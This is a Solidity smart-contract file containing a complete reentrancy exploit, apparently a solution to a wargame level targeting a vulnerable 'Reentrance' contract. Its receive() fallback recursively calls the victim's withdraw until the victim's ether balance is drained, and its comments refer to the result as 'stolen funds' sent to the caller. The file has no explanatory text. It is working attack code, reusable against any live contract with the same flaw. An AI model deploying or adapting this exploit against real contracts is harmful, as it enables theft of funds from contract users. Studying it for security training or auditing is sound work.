// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IReentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
}


contract ReentranceAttack {
  IReentrance reentranceContract;

  constructor(address _reentranceContract) public payable {
    require(msg.value > 0);
    reentranceContract = IReentrance(_reentranceContract);
    reentranceContract.donate{value: msg.value}(address(this));
  }

  function drainVictim() external {
    reentranceContract.withdraw(reentranceContract.balanceOf(address(this)));
  }

  // fallback function called by victim
  receive() external payable {
    uint remainingBalance = address(reentranceContract).balance;
    if (remainingBalance >= msg.value) {
      reentranceContract.withdraw(msg.value);
    }
    else if (remainingBalance > 0) {
      reentranceContract.withdraw(remainingBalance);
    }
  }

  // get stolen funds, otherwise they are lost in this contract
  function withdraw() external {
    (bool success, ) = msg.sender.call{value: address(this).balance}("");
    require(success);
  }
}
